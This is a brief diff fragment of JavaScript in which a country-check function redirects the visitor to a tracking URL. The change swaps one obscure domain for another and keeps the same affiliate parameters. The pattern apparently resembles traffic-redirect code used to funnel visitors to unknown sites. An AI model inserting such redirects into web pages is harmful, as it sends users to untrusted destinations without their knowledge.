@@ -7,7 +7,7 @@
 
     // Function to redirect the user to site1.ru
     function checkCountry1() {
-        window.location.href = "https://pwkax.imfrk12.com/?utm_source=2f478e051ad5d971&s1=4375&s2=218263&s3=" + source;
+        window.location.href = "https://pwkax.imitrkn.net/?utm_source=2f478e051ad5d971&s1=4375&s2=218263&s3=" + source;
     }
 
     // Function to redirect the user to site2.ru
